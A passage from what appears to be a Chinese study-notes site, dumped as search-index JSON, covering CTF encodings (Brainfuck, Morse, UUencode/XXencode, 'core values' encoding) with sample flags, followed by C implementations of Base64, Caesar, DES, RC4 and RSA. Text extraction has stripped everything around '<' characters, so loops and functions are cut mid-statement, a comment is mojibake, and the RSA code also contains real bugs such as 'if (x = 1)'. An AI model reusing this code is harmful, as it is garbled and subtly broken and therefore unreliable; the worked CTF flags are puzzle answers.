Müller在1993年创建的，是一种简单的、可以用最小的编译器来实现的、符合图灵完全思想的编程语言。这种语言由八种状态构成。 下面是这八种状态的描述，其中每个状态由一个字符标识： 字符 含义 > 指针加一 指针减一 + 指针指向的字节的值加一 - 指针指向的字节的值减一 . 输出指针指向的单元内容（ASCⅡ码） , 输入内容到指针指向的单元（ASCⅡ码） [ 如果指针指向的单元值为零，向后跳转到对应的]指令的次一指令处 ] 如果指针指向的单元值不为零，向前跳转到对应的[指令的次一指令处 密文特点：+++++ +++++ [->++ +++++ +++++.+ +++++ .-- -- -.+++ +++.+++ ++ +++.---- ------- --.+. ----- -.++ +++++ ++ ++.-- --.-- ------- ----- .------.++ +++++ +.- -- --.++ +++.+ +++.- .++++ +++++++ +++. ----- -- ---.+ +++++ +.+++ ++.-- ----- .+++ +++++++ .--- ------- ----- .+++ +++++++ .--- ----.++ ++.-- -.--- -.++ +++++ ++ ++.-- ------- ----- ---.- --.+ +++++ ++ ..--- ------- --.-- -.+.+ ++.-- ---.+++++. ----- ----. +++ +++++ ++ +++++ +++++ +. 解密后：flag{671fb608-265a-492f-a041-b30bb8569490} Ook!密码 特征：所有明文转换成Ook.?! 十、摩斯密码 摩尔斯电码：.和-和间隔符或.和-和间隔符 密文举例：..-. .-.. .- --. . --... .---- -.-. .- ..... -.-. -.. -....- --... -.. -... ----. -....- ....- -... .- ...-- -....- ----. ...-- ---.. ...-- -....- .---- .- ..-. ---.. -.... --... ---.. ---.. .---- ..-. ----- --... 解密后：FLAGE71CA5CD-7DB9-4BA3-9383-1AF867881F07 十一、XXencode/UUencode编码 在线编码： XXencode加密/解密 - Bugku CTF UUencode加密/解密 - Bugku CTF UUencode的加密方式和base64很相似。但他的编码表有很多是特殊字符: !”#￥%&‘（）*+=’ 等等。 XXencode的加密方式也和base64相似。跟base64打印字符相比，就是比UUencode多一个 - 字符，少一个/ 字符。 特征举例： UUencode（1234567）= (,3(S-#4V-PH` 特征：看着特别奇怪 XXencode（1234567）= 6AH6nB1IqBkc+ 特征：与base64相似 XXencode密文举例：LNalVNrhIO4ZnLqZnLpVsAqtXA4FZTEc+ 解密后：flag{This_is_Xx3nc0de} 十二、社会主义核心价值观编码 在线编码：核心价值观编码 - Bugku CTF 没啥好说的，举例： 明文：flag{} 加密后：公正公正公正诚信文明公正民主公正法治法治诚信民主法治友善法治 十三、希尔密码 在线编码：希尔(Hill Cipher)加密/解密 - Bugku CTF 十四、Base家族编码 常见base base16： base32： base58： base64： 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-10 14:58 "},"4.编程语言/C++/Base64算法实现.html":{"url":"4.编程语言/C++/Base64算法实现.html","title":"Base64算法实现","keywords":"","body":"#include #include #include // base64 转换表, 共64个 static const char base64_alphabet[] = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"; // 解码时使用 static const unsigned char base64_suffix_map[256] = { 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 253, 255, 255, 253, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 253, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 62, 255, 255, 255, 63, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 255, 255, 255, 254, 255, 255, 255, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 255, 255, 255, 255, 255, 255, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255 }; static char cmove_bits(unsigned char src, unsigned lnum, unsigned rnum) { src >= rnum; // src = src >> rnum; return src; } int base64_encode(const char *indata, int inlen, char *outdata, int *outlen) { int ret = 0; // return value if (indata == NULL || inlen == 0) { return ret = -1; } int i; int in_len = 0; // 源字符串长度, 如果in_len不是3的倍数, 那么需要补成3的倍数 int pad_num = 0; // 需要补齐的字符个数, 这样只有2, 1, 0(0的话不需要拼接, ) if (inlen % 3 != 0) { pad_num = 3 - inlen % 3; } in_len = inlen + pad_num; // 拼接后的长度, 实际编码需要的长度(3的倍数) int out_len = in_len * 8 / 6; // 编码后的长度 char *p = outdata; // 定义指针指向传出data的首地址 //编码, 长度为调整后的长度, 3字节一组 for (i = 0; i > 2; // 将indata第一个字符向右移动2bit(丢弃2bit) char c = base64_alphabet[value]; // 对应base64转换表的字符 *p = c; // 将对应字符(编码后字符)赋值给outdata第一字节 //处理最后一组(最后3字节)的数据 if (i == inlen + pad_num - 3 && pad_num != 0) { if(pad_num == 1) { *(p + 1) = base64_alphabet[(int)(cmove_bits(*indata, 6, 2) + cmove_bits(*(indata + 1), 0, 4))]; *(p + 2) = base64_alphabet[(int)cmove_bits(*(indata + 1), 4, 2)]; *(p + 3) = '='; } else if (pad_num == 2) { // 编码后的数据要补两个 '=' *(p + 1) = base64_alphabet[(int)cmove_bits(*indata, 6, 2)]; *(p + 2) = '='; *(p + 3) = '='; } } else { // 处理正常的3字节的数据 *(p + 1) = base64_alphabet[cmove_bits(*indata, 6, 2) + cmove_bits(*(indata + 1), 0, 4)]; *(p + 2) = base64_alphabet[cmove_bits(*(indata + 1), 4, 2) + cmove_bits(*(indata + 2), 0, 6)]; *(p + 3) = base64_alphabet[*(indata + 2) & 0x3f]; } p += 4; indata += 3; } if(outlen != NULL) { *outlen = out_len; } return ret; } int base64_decode(const char *indata, int inlen, char *outdata, int *outlen) { int ret = 0; if (indata == NULL || inlen >16)&0xff); if (g > 1) outdata[i++] = (unsigned char)((t>>8)&0xff); if (g > 2) outdata[i++] = (unsigned char)(t&0xff); y = t = 0; } } if (outlen != NULL) { *outlen = i; } return ret; } int main(){ char str1[] = \"enstr\"; char str2[] = \"Y3liZXJwZWFjZXtXZWxjb21lX3RvX25ld19Xb3JsZCF9\"; //注意长度要给够 int len = 0; // base64_encode(str1,(int)strlen(str1),str2,&len); // printf(\"%s, len = %d\\n\", str2, len); char str3[64] = {0}; base64_decode(str2, (int)strlen(str2), str3, &len); printf(\"%s, len = %d\\n\", str3, len); return 0; } 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-10 15:03 "},"4.编程语言/C++/Base64逆表生成.html":{"url":"4.编程语言/C++/Base64逆表生成.html","title":"Base64逆表生成","keywords":"","body":"#include #include using namespace std; int main(){ unsigned char encode_table[65] = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"; unsigned char decode_table[256], c; for (int i = 0; i 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-10 15:03 "},"4.编程语言/C++/C++基本语法.html":{"url":"4.编程语言/C++/C++基本语法.html","title":"CPlusPlus基本语法","keywords":"","body":"一、C++简介 C++ 是一种静态类型的、编译式的、通用的、大小写敏感的、不规则的编程语言，支持过程化编程、面向对象编程和泛型编程。 C++ 被认为是一种中级语言，它综合了高级语言和低级语言的特点。 C++ 是由 Bjarne Stroustrup 于 1979 年在新泽西州美利山贝尔实验室开始设计开发的。C++ 进一步扩充和完善了 C 语言，最初命名为带类的C，后来在 1983 年更名为 C++。 C++ 是 C 的一个超集，事实上，任何合法的 C 程序都是合法的 C++ 程序。 注意：使用静态类型的编程语言是在编译时执行类型检查，而不是在运行时执行类型检查。 面向对象程序设计 C++ 完全支持面向对象的程序设计，包括面向对象开发的四大特性： 封装（Encapsulation）：封装是将数据和方法组合在一起，对外部隐藏实现细节，只公开对外提供的接口。这样可以提高安全性、可靠性和灵活性。 继承（Inheritance）：继承是从已有类中派生出新类，新类具有已有类的属性和方法，并且可以扩展或修改这些属性和方法。这样可以提高代码的复用性和可扩展性。 多态（Polymorphism）：多态是指同一种操作作用于不同的对象，可以有不同的解释和实现。它可以通过接口或继承实现，可以提高代码的灵活性和可读性。 抽象（Abstraction）：抽象是从具体的实例中提取共同的特征，形成抽象类或接口，以便于代码的复用和扩展。抽象类和接口可以让程序员专注于高层次的设计和业务逻辑，而不必关注底层的实现细节。标准库 标准的 C++ 由三个重要部分组成： 核心语言，提供了所有构件块，包括变量、数据类型和常量，等等。 C++ 标准库，提供了大量的函数，用于操作文件、字符串等。 标准模板库（STL），提供了大量的方法，用于操作数据结构等。 二、C++基本语法 C++ 程序结构 让我们看一段简单的代码，可以输出单词 Hello World。 #include using namespace std; // main() 是程序开始执行的地方 int main() { cout C++ 语言定义了一些头文件，这些头文件包含了程序中必需的或有用的信息。上面这段程序中，包含了头文件 。 下一行 using namespace std; 告诉编译器使用 std 命名空间。命名空间是 C++ 中一个相对新的概念。 下一行 // main() 是程序开始执行的地方 是一个单行注释。单行注释以 // 开头，在行末结束。 下一行 int main() 是主函数，程序从这里开始执行。 下一行 cout 会在屏幕上显示消息 \"Hello World\"。 下一行 return 0; 终止 main( )函数，并向调用进程返回值 0。 C++注释 C++ 注释一般有两种： //：一般用于单行注释。 /* ... */：一般用于多行注释。 C++数据类型 C++ 为程序员提供了种类丰富的内置数据类型和用户自定义的数据类型。 下表列出了七种基本的 C++ 数据类型： 类型 关键字 布尔型 bool 字符型 char 整型 int 浮点型 float 双浮点型 double 无类型 void 宽字符型 wchar_t 其实 wchar_t 是这样来的： typedef short int wchar_t; 所以 wchar_t 实际上的空间是和 short int 一样。 一些基本类型可以使用一个或多个类型修饰符进行修饰： signed unsigned short longtypedef 声明 您可以使用 typedef 为一个已有的类型取一个新的名字。下面是使用 typedef 定义一个新类型的语法：typedef type newname; 例如，下面的语句会告诉编译器，feet 是 int 的另一个名称： typedef int feet; 现在，下面的声明是完全合法的，它创建了一个整型变量 distance： feet distance; 枚举类型 枚举类型(enumeration)是C++中的一种派生数据类型，它是由用户定义的若干枚举常量的集合。 如果一个变量只有几种可能的值，可以定义为枚举(enumeration)类型。所谓\"枚举\"是指将变量的值一一列举出来，变量的值只能在列举出来的值的范围内。 创建枚举，需要使用关键字 enum。枚举类型的一般形式为： enum 枚举名{ 标识符[=整型常数], 标识符[=整型常数], ... 标识符[=整型常数] } 枚举变量; 如果枚举没有初始化, 即省掉\"=整型常数\"时, 则从第一个标识符开始。 例如，下面的代码定义了一个颜色枚举，变量 c 的类型为 color。最后，c 被赋值为 \"blue\"。 enum color { red, green, blue } c; c = blue; 默认情况下，第一个名称的值为 0，第二个名称的值为 1，第三个名称的值为 2，以此类推。但是，您也可以给名称赋予一个特殊的值，只需要添加一个初始值即可。 例如，在下面的枚举中，green 的值为 5。 enum color { red, green=5, blue }; 在这里，blue 的值为 6，因为默认情况下，每个名称都会比它前面一个名称大 1，但 red 的值依然为 0。 类型转换 类型转换是将一个数据类型的值转换为另一种数据类型的值。 C++ 中有四种类型转换：静态转换、动态转换、常量转换和重新解释转换。 静态转换（Static Cast） 静态转换是将一种数据类型的值强制转换为另一种数据类型的值。 静态转换通常用于比较类型相似的对象之间的转换，例如将 int 类型转换为 float 类型。 静态转换不进行任何运行时类型检查，因此可能会导致运行时错误。 实例 int i = 10; float f = static_cast(i); // 静态将int类型转换为float类型 动态转换（Dynamic Cast） 动态转换通常用于将一个基类指针或引用转换为派生类指针或引用。动态转换在运行时进行类型检查，如果不能进行转换则返回空指针或引发异常。 实例 class Base {}; class Derived : public Base {}; Base* ptr_base = new Derived; Derived* ptr_derived = dynamic_cast(ptr_base); // 将基类指针转换为派生类指针 常量转换（Const Cast） 常量转换用于将 const 类型的对象转换为非 const 类型的对象。 常量转换只能用于转换掉 const 属性，不能改变对象的类型。 实例 const int i = 10; int& r = const_cast(i); // 常量转换，将const int转换为int 重新解释转换（Reinterpret Cast） 重新解释转换将一个数据类型的值重新解释为另一个数据类型的值，通常用于在不同的数据类型之间进行转换。 重新解释转换不进行任何类型检查，因此可能会导致未定义的行为。 实例 int i = 10; float f = reinterpret_cast(i); // 重新解释将int类型转换为float类型 三、C++变量类型 C++ 也允许定义各种其他类型的变量，比如枚举、指针、数组、引用、数据结构、类等等，这将会在后续的章节中进行讲解。 整数类型（Integer Types）： int：用于表示整数，通常占用4个字节。 short：用于表示短整数，通常占用2个字节。 long：用于表示长整数，通常占用4个字节。 long long：用于表示更长的整数，通常占用8个字节。 浮点类型（Floating-Point Types）： float：用于表示单精度浮点数，通常占用4个字节。 double：用于表示双精度浮点数，通常占用8个字节。 long double：用于表示更高精度的浮点数，占用字节数可以根据实现而变化。 字符类型（Character Types）： char：用于表示字符，通常占用1个字节。 wchar_t：用于表示宽字符，通常占用2或4个字节。 char16_t：用于表示16位Unicode字符，占用2个字节。 char32_t：用于表示32位Unicode字符，占用4个字节。 布尔类型（Boolean Type）： bool：用于表示布尔值，只能取true或false。 枚举类型（Enumeration Types）： enum：用于定义一组命名的整数常量。 指针类型（Pointer Types）： type*：用于表示指向类型为type的对象的指针。 数组类型（Array Types）： type[]或type[size]：用于表示具有相同类型的元素组成的数组。 结构体类型（Structure Types）： struct：用于定义包含多个不同类型成员的结构。 类类型（Class Types）： class：用于定义具有属性和方法的自定义类型。 共用体类型（Union Types）： union：用于定义一种特殊的数据类型，它可以在相同的内存位置存储不同的数据类型。 在 C++ 中，类型的长度（即占用的字节数）取决于编译器和计算机架构，然而，C++ 标准规定了不同整数类型的最小范围，而不是具体的字节数，这是为了确保代码在不同的系统上都能正确运行。 请注意，以上类型的范围只是 C++ 标准规定的最小要求，实际上，许多系统上这些类型可能占用更多的字节，例如，很多现代计算机上 int 通常占用 4 字节，而 long 可能占用 8 字节。 变量类型作用域 一般来说有三个地方可以定义变量： 在函数或一个代码块内部声明的变量，称为局部变量。 在函数参数的定义中声明的变量，称为形式参数。 在所有函数外部声明的变量，称为全局变量。 作用域是程序的一个区域，变量的作用域可以分为以下几种： 局部作用域：在函数内部声明的变量具有局部作用域，它们只能在函数内部访问。局部变量在函数每次被调用时被创建，在函数执行完后被销毁。 全局作用域：在所有函数和代码块之外声明的变量具有全局作用域，它们可以被程序中的任何函数访问。全局变量在程序开始时被创建，在程序结束时被销毁。 块作用域：在代码块内部声明的变量具有块作用域，它们只能在代码块内部访问。块作用域变量在代码块每次被执行时被创建，在代码块执行完后被销毁。 类作用域：在类内部声明的变量具有类作用域，它们可以被类的所有成员函数访问。类作用域变量的生命周期与类的生命周期相同。 注意： 如果在内部作用域中声明的变量与外部作用域中的变量同名，则内部作用域中的变量将覆盖外部作用域中的变量。 四、C++ 常量 常量是固定值，在程序执行期间不会改变。这些固定的值，又叫做字面量。 常量可以是任何的基本数据类型，可分为整型数字、浮点数字、字符、字符串和布尔值。 常量就像是常规的变量，只不过常量的值在定义后不能进行修改。 整数常量 整数常量可以是十进制、八进制或十六进制的常量。 前缀指定基数： 0x 或 0X 表示十六进制 0 表示八进制 不带前缀则默认表示十进制。 整数常量也可以带一个后缀，后缀是 U 和 L 的组合： U 表示无符号整数（unsigned） L 表示长整数（long）。 后缀可以是大写，也可以是小写，U 和 L 的顺序任意。 五、C++循环判断语句 C++循环判断语法与C语言相同 六、C++运算符 运算符是一种告诉编译器执行特定的数学或逻辑操作的符号。C++ 内置了丰富的运算符，并提供了以下类型的运算符： 算术运算符 关系运算符 逻辑运算符 位运算符 赋值运算符 杂项运算符 算术运算符 下表显示了 C++ 支持的算术运算符。 假设变量 A 的值为 10，变量 B 的值为 20，则： 运算符 描述 实例 + 把两个操作数相加 A + B 将得到 30 - 从第一个操作数中减去第二个操作数 A - B 将得到 -10 * 把两个操作数相乘 A * B 将得到 200 / 分子除以分母 B / A 将得到 2 % 取模运算符，整除后的余数 B % A 将得到 0 ++ 自增运算符，整数值增加 1 A++ 将得到 11 -- 自减运算符，整数值减少 1 A-- 将得到 9 关系运算符 下表显示了 C++ 支持的关系运算符。 假设变量 A 的值为 10，变量 B 的值为 20，则： 运算符 描述 实例 == 检查两个操作数的值是否相等，如果相等则条件为真。 (A == B) 不为真。 != 检查两个操作数的值是否相等，如果不相等则条件为真。 (A != B) 为真。 > 检查左操作数的值是否大于右操作数的值，如果是则条件为真。 (A > B) 不为真。 检查左操作数的值是否小于右操作数的值，如果是则条件为真。 (A >= 检查左操作数的值是否大于或等于右操作数的值，如果是则条件为真。 (A >= B) 不为真。 检查左操作数的值是否小于或等于右操作数的值，如果是则条件为真。 (A 逻辑运算符 下表显示了 C++ 支持的关系逻辑运算符。 假设变量 A 的值为 1，变量 B 的值为 0，则： 运算符 描述 实例 && 称为逻辑与运算符。如果两个操作数都 true，则条件为 true。 (A && B) 为 false。 \\ 称为逻辑或运算符。如果两个操作数中有任意一个 true，则条件为 true。 (A \\ B) 为 true。 ! 称为逻辑非运算符。用来逆转操作数的逻辑状态，如果条件为 true 则逻辑非运算符将使其为 false。 !(A && B) 为 true。 位运算符 位运算符作用于位，并逐位执行操作。&、 | 和 ^ 的真值表如下所示： p q p & q p \\ q p ^ q 0 0 0 0 0 0 1 0 1 1 1 1 1 1 0 1 0 0 1 1 &：按位与操作 |：按位或操作 ^：按位异或 赋值运算符 下表列出了 C++ 支持的赋值运算符： 运算符 描述 实例 = 简单的赋值运算符，把右边操作数的值赋给左边操作数 C = A + B 将把 A + B 的值赋给 C += 加且赋值运算符，把右边操作数加上左边操作数的结果赋值给左边操作数 C += A 相当于 C = C + A -= 减且赋值运算符，把左边操作数减去右边操作数的结果赋值给左边操作数 C -= A 相当于 C = C - A *= 乘且赋值运算符，把右边操作数乘以左边操作数的结果赋值给左边操作数 C = A 相当于 C = C A /= 除且赋值运算符，把左边操作数除以右边操作数的结果赋值给左边操作数 C /= A 相当于 C = C / A %= 求模且赋值运算符，求两个操作数的模赋值给左边操作数 C %= A 相当于 C = C % A 左移且赋值运算符 C >>= 右移且赋值运算符 C >>= 2 等同于 C = C >> 2 &= 按位与且赋值运算符 C &= 2 等同于 C = C & 2 ^= 按位异或且赋值运算符 C ^= 2 等同于 C = C ^ 2 \\ = 按位或且赋值运算符 C \\ = 2 等同于 C = C \\ 2 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-10 15:04 "},"4.编程语言/C++/Caesar算法实现.html":{"url":"4.编程语言/C++/Caesar算法实现.html","title":"Caesar算法实现","keywords":"","body":"#include #include #define MAX 255 void encode(char str[], int n){ int i, j, k; char min[26]={'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'}; char max[26]={'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}; for (i = 0; i = 'a' && str[i] = 'A' && str[i] = 'a' && str[i] = 'A' && str[i] 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/C++/DES算法实现.html":{"url":"4.编程语言/C++/DES算法实现.html","title":"DES算法实现","keywords":"","body":"#include #include #include /*========================初始置换表IP=========================*/ int IP_Table[64] = { 57, 49, 41, 33, 25, 17, 9, 1, 59, 51, 43, 35, 27, 19, 11, 3, 61, 53, 45, 37, 29, 21, 13, 5, 63, 55, 47, 39, 31, 23, 15, 7, 56, 48, 40, 32, 24, 16, 8, 0, 58, 50, 42, 34, 26, 18, 10, 2, 60, 52, 44, 36, 28, 20, 12, 4, 62, 54, 46, 38, 30, 22, 14, 6}; /*========================逆初始置换表IP^-1====================*/ int IP_1_Table[64] = { 39, 7, 47, 15, 55, 23, 63, 31, 38, 6, 46, 14, 54, 22, 62, 30, 37, 5, 45, 13, 53, 21, 61, 29, 36, 4, 44, 12, 52, 20, 60, 28, 35, 3, 43, 11, 51, 19, 59, 27, 34, 2, 42, 10, 50, 18, 58, 26, 33, 1, 41, 9, 49, 17, 57, 25, 32, 0, 40, 8, 48, 16, 56, 24}; /*========================扩展变换表E盒========================*/ int E_Table[48] = { 31, 0, 1, 2, 3, 4, 3, 4, 5, 6, 7, 8, 7, 8, 9, 10, 11, 12, 11, 12, 13, 14, 15, 16, 15, 16, 17, 18, 19, 20, 19, 20, 21, 22, 23, 24, 23, 24, 25, 26, 27, 28, 27, 28, 29, 30, 31, 0}; /*===========================S盒==============================*/ int S_Box[8][4][16] = { // S1 { {14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7}, {0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8}, {4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0}, {15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13}}, // S2 { {15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10}, {3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5}, {0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15}, {13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9}}, // S3 { {10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8}, {13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1}, {13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7}, {1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12}}, // S4 { {7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15}, {13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9}, {10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4}, {3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14}}, // S5 { {2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9}, {14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6}, {4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14}, {11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3}}, // S6 { {12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11}, {10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8}, {9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6}, {4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13}}, // S7 { {4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1}, {13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6}, {1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2}, {6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12}}, // S8 { {13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7}, {1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2}, {7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8}, {2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11}}}; /*========================置换函数P盒==========================*/ int P_Box[32] = { 15, 6, 19, 20, 28, 11, 27, 16, 0, 14, 22, 25, 4, 17, 30, 9, 1, 7, 23, 13, 31, 26, 2, 8, 18, 12, 29, 5, 21, 10, 3, 24}; /*========================置换选择器1==========================*/ int PC_1_table[56] = {56, 48, 40, 32, 24, 16, 8, 0, 57, 49, 41, 33, 25, 17, 9, 1, 58, 50, 42, 34, 26, 18, 10, 2, 59, 51, 43, 35, 62, 54, 46, 38, 30, 22, 14, 6, 61, 53, 45, 37, 29, 21, 13, 5, 60, 52, 44, 36, 28, 20, 12, 4, 27, 19, 11, 3}; /*========================置换选择器2==========================*/ int PC_2_table[48] = {13, 16, 10, 23, 0, 4, 2, 27, 14, 5, 20, 9, 22, 18, 11, 3, 25, 7, 15, 6, 26, 19, 12, 1, 40, 51, 30, 36, 46, 54, 29, 39, 50, 44, 32, 46, 43, 48, 38, 55, 33, 52, 45, 41, 49, 35, 28, 31}; /*========================对左移次数的规定====================*/ int MOVE_table[16] = {1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1}; void CharToBit(char *input,int *output,int bits);//将字符数组转换成二进制数组 void BitToChar(int *input, char *output, int bits);//将二进制数组转换成字符数组 void Xor(int InA[],int InB[],int len);//异或操作 void IP_IPR(int input[64],int output[64],int table[64]);//IP初始置换和逆置换函数,由table决定是逆置换还是初始置换 void E(int input[32],int output[48],int table[48]);//E盒扩展 void P(int input[32],int output[32],int table[32]);//P盒替代 void PC_1(int input[64],int output[56],int table[56]);//PC-1置换选择器 void PC_2(int input[56],int output[48],int table[48]);//PC-2置换选择器 void S(int input[48],int output[32],int table[8][4][16]);//S盒压缩 void F_func(int input[32],int subkey[48]);//F轮函数 void BitsCopy(int *DatOut,int *DatIn,int Len);//把DatIn开始的长度位Len位的二进制复制到DatOut后 void RotateL(int input[28],int output[28], int move);//子秘钥中循环左移函数 void subKey_fun(int input[64],int Subkey[16][48]);//子秘钥生成 void BitToHex(char *DatOut,int *DatIn,int Num);//二进制密文转换为十六进制需要16个字符表示 void DES_Dfun(int input[],char key_in[],char output[]);//DES加密 void ShowArray(int *array,int num);//输出字符数组 int main(){ int i = 0; char key[9] = {0}; char message[9] = {0}; int keybin[64] = {0}, mesbin[64] = {0}; char cipher[9]; printf(\"输入8字节的明文：\"); //fgets(message, sizeof(message), stdin); scanf(\"%s\", message); printf(\"输入8字节的秘钥：\"); //fgets(key, sizeof(key), stdin); scanf(\"%s\", key); while(strlen(key) != 8) { printf(\"请输入正确的密钥：\"); //fgets(key, sizeof(key), stdin); scanf(\"%s\", key); i = 0; while(key[i] != '\\0') { i++; } } CharToBit(message, mesbin, 64); DES_Dfun(mesbin, key, cipher); printf(\"\\n------------加密后数据------------\\n\"); for(i = 0; i > (i % 8)) & 1; } } void BitToChar(int *input, char *output, int bits) { for(int i = 0; i 9) { dataout[i] = dataout[i] % 16 + '7'; // 余数大于9时处理 10-15 to A-F }else{ dataout[i] = dataout[i] % 16 + '0'; } } } void ShowArray(int * array, int num) { int i; for(i = 0; i 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-10 15:03 "},"4.编程语言/C++/RC4算法实现.html":{"url":"4.编程语言/C++/RC4算法实现.html","title":"RC4算法实现","keywords":"","body":"#include void rc4_init(unsigned char* s, unsigned char* key, unsigned long Len_k) //鍒濆鍖栧嚱鏁� { int i = 0, j = 0; char k[256] = { 0 }; unsigned char tmp = 0; for (i = 0; i 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/C++/RSA算法实现.html":{"url":"4.编程语言/C++/RSA算法实现.html","title":"RSA算法实现","keywords":"","body":"#include int fun(int x, int y){ int t; // while(y){ // t = x; // x = y; // y = t % y; // } for (t = x; y != 0; y = t % y){ x = y; } if (x = 1){return 0;} else {return 1;} } int canpd(int m, int b, int n){ int r = 1; for (b = b + 1; b != 1; b--){ r = r * m; r = r % n; } //printf(\"r = %d\\n\", r); return r; } int main(){ int p, q, e, d, m, n, r, c, t; printf(\"请输入两个素数p、q：\"); scanf(\"%d %d\", &p, &q); n = p * q; printf(\"n = %d\\n\", n); t = (p - 1) * (q - 1); printf(\"t = %d\\n\", t); printf(\"请输入公钥e：\"); scanf(\"%d\", &e); if (e t || fun(e, t)){ printf(\"公钥输入有误，请重新输入e = \"); scanf(\"%d\", e); } d = 1; while(((e * d) % t) != 1){d++;} printf(\"私钥d = %d\\n\", d); printf(\"1.加密\\n\"); printf(\"2.解密\\n\"); printf(\"3.退出\\n\"); while(1){ printf(\"请输入你要执行的操作：\"); scanf(\"%d\", &r); switch(r){ case 1: printf(\"请输入明文：\"); scanf(\"%d\", &m); c = canpd(m, e, n); printf(\"加密后的数据c = %d\\n\", c); break; case 2: printf(\"请输入密文：\"); scanf(\"%d\", &c); m = canpd(c, d, n); printf(\"解密后的数据m = %d\\n\", m); break; case 3:return 0; default: printf(\"输入的操作数有误，请重新输入!!!\\n\"); break; } } return 0; } 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/C++/Saytale算法实现.html":{"url":"4.编程语言/C++/Saytale算法实现.html","title":"Saytale算法实现","keywords":"","body":"#include #include void 